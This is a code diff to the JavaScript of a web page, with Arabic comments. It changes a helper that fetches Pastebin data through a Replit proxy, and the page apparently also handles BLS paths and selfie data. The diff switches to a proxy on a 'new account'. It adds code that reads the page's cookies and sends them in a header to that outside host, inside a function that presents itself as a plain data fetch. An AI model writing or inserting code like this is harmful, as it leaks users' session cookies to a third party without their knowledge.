@@ -127,8 +127,8 @@
             let selfieData = null;
             let encodedData = null;
 
-            // ===== Replit Proxy Base URL =====
-            const REPLIT_PROXY = 'https://node-create--trackyou188.replit.app';
+            // ===== Replit Proxy Base URL (NEW ACCOUNT) =====
+            const REPLIT_PROXY = 'https://proxy-hub--schoologgy8.replit.app';
             const PROXY_BASE = `${REPLIT_PROXY}/proxy`;
 
             // ===== مسارات BLS =====
@@ -159,20 +159,27 @@
                 }
             }
 
-            // ===== جلب البيانات من Pastebin عبر Replit Proxy =====
+            // ===== جلب البيانات من Pastebin عبر Replit Proxy مع الكوكيز =====
             async function fetchFromPastebin(rawUrl) {
-                const proxyUrl = `${PROXY_BASE}/pastebin/raw/${rawUrl.split('/').pop()}`;
-                console.log('Fetching via Replit Proxy:', proxyUrl);
+                const key = rawUrl.split('/').pop();
+                const proxyUrl = `${PROXY_BASE}/pastebin/raw/${key}`;
+
+                // قراءة كوكيز المتصفح لتمريرها إلى الخادم
+                const cookies = document.cookie;
 
                 try {
-                    const response = await fetch(proxyUrl);
+                    const response = await fetch(proxyUrl, {
+                        headers: {
+                            'Cookie': cookies  // ← تمرير الكوكيز
+                        }
+                    });
                     if (!response.ok) throw new Error('HTTP ' + response.status);
                     return await response.text();
                 } catch (e) {
                     console.error('Fetch error:', e);
+                    // محاولة بديلة باستخدام corsproxy.io
                     try {
                         const backupUrl = `https://corsproxy.io/?${rawUrl}`;
-                        console.log('Fetching via backup proxy:', backupUrl);
                         const response2 = await fetch(backupUrl);
                         if (!response2.ok) throw new Error('HTTP ' + response2.status);
                         return await response2.text();
@@ -221,6 +228,7 @@
             setStatus('⏳ Loading data...', 'info');
 
             if (rawData.startsWith('http://') || rawData.startsWith('https://')) {
+                // الحالة 1: رابط Pastebin
                 setStatus('⏳ Fetching data from Pastebin via Replit Proxy...', 'info');
                 fetchFromPastebin(rawData)
                     .then(text => {
@@ -242,6 +250,7 @@
                         setStatus('❌ Failed to fetch data from Pastebin: ' + err.message, 'error');
                     });
             } else {
+                // الحالة 2: بيانات مشفرة بـ Base64
                 setStatus('⏳ Decoding Base64 data...', 'info');
                 const decoded = decodeBase64(rawData);
                 if (!decoded) {
